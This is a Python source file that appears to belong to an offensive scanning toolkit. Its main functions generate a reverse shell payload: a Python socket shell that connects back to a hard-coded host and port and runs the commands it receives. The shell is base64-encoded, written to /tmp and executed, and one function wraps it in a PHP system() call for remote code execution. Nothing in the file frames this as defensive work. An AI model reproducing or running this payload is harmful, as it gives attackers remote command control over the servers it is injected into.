import binascii

def scan(url, method_list):

    result_list = []
    for method in method_list:
        result = method(url)
        result_list.append(result)
    print("{:<30s} {:<50s}".format("URL","漏洞列表"))
    print("{:<30s} {:<50s}".format(str(url),str(result_list)))


def linux_python_reverse_shell():

    server = ("10.72.160.176",8888)

    py = f'''
import socket
import subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
t={server}
r=s.connect(t)
while True:
    c=s.recv(1024).decode()
    p=subprocess.Popen(c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    o,e=p.communicate()
    s.sendall(o)
    '''
    base64encode = binascii.b2a_base64(py.encode())
    cmd = f'echo {base64encode}|base64 -d > /tmp/r.py&&python /tmp/r.py"'

    return cmd


def php_linux_rce():
    cmd= linux_python_reverse_shell()
    shellcode = f'system("{cmd}");'

    return shellcode
